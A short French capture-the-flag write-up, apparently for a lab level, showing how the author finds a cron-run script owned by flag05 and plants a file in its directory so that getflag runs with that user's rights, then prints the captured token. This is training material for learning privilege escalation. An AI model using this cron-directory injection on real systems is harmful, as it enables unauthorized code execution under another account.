rien dans le home on cherche des trucs sur -user flag05 : 
```shell
find / -user flag05 2> /dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

```shell
cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
Ca ressemble a un programe lancer par CRON.

on peut faire l'essais suivant:
```shell
touch /opt/openarenaserver/essais
chmod 755 /opt/openarenaserver/essais
```
au bout de 2 mn le fichier a disparu...

On va creer un fichier run qui execute getflag et renvoi le token dans un repertoire. le seul ou l'on peut 2crire est /tmp

```shell
echo 'getflag > /tmp/token' > /opt/openarenaserver/run
chmod 755 /opt/openarenaserver/run
```
apres 2 minutes notre run a ecrit dans /tmp: 
```shell
cat /tmp/token
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
Check flag.Here is your token : viuaaale9huek52boumoomioc